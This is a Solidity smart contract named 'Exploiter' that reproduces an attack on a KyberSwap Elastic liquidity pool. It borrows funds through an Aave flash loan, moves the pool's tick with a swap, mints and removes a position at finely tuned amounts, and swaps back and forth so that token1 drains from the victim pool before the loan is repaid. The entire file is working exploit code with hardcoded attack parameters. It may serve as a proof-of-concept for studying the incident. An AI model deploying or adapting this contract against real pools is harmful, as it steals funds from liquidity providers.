//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IBasePositionManager as IKyberswapPositionManager} from "./interfaces/periphery/IBasePositionManager.sol";
import {IPool as IKyberswapPool} from "./interfaces/IPool.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes memory params,
        uint16 referralCode
    ) external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract Exploiter {
    IKyberswapPool public victimPool;
    address public lender;
    IERC20 public token0;
    IERC20 public token1;
    uint256 public flashloanAmount;
    IKyberswapPositionManager public positionManager;

    constructor(address _victimPool, address _lender, uint256 _flashloanAmount, address _positionManager) {
        victimPool = IKyberswapPool(_victimPool);
        lender = _lender;
        token0 = IERC20(address(victimPool.token0()));
        token1 = IERC20(address(victimPool.token1()));
        flashloanAmount = _flashloanAmount;
        positionManager = IKyberswapPositionManager(_positionManager);
    }

    function trigger() public {
        IAavePool(lender).flashLoanSimple(address(this), address(token1), flashloanAmount, "", 0);
    }

    //flash loan core logic
    function _flashCallback(uint256 due) internal returns (bool) {
        int24 _currentTick;
        int24 _nearestCurrentTick;
        uint24 _swapFee;
        uint160 _sqrtP;
        uint256 _tokenId;

        //setting the swap fee
        _swapFee = victimPool.swapFeeUnits();

        //giving required approval to mint the position
        token0.approve(address(positionManager), type(uint256).max);
        token1.approve(address(positionManager), type(uint256).max);

        //step1: move the tick range with 0 liquidity
        victimPool.swap(address(this), int256(flashloanAmount), false, 0x100000000000000000000000000, "");//limit price 20282409603651670423947251286016

        //step2: mint/supply liquidity
        (_sqrtP, _currentTick, _nearestCurrentTick,) = victimPool.getPoolState();
        (_tokenId,,,) = positionManager.mint(
            IKyberswapPositionManager.MintParams({
                token0: address(token0),
                token1: address(token1),
                fee: _swapFee,
                tickLower: _currentTick,
                tickUpper: 111_310,
                ticksPrevious: [_nearestCurrentTick, _nearestCurrentTick],
                amount0Desired: 6_948_087_773_336_076,
                amount1Desired: 107_809_615_846_697_233,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp

            })
        );

        //step3: remove liquidity
        positionManager.removeLiquidity(
            IKyberswapPositionManager.RemoveLiquidityParams({
                tokenId: _tokenId,
                liquidity: 14_938_549_516_730_950_591,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        //step4/5: swap back and forth
        victimPool.swap(
            address(this), 387_170_294_533_119_999_999, false, 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341, ""
        );

        victimPool.swap(
            address(this), -int256(token1.balanceOf(address(victimPool))), false, 4_295_128_740, ""
        );

        //repay the flash loan
        token1.approve(lender, due);

        return true;

    }

    //swap callback
    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) external {
        if (deltaQty0 > 0) {
            token0.transfer(msg.sender, uint256(deltaQty0));
        } else if (deltaQty1 > 0) {
            token1.transfer(msg.sender, uint256(deltaQty1));
        }
    }

    //flash loan callback for aave
     function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        return _flashCallback(amount + premium);
    }

    //flash loan callback for uni
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        _flashCallback(fee1);
    }


}

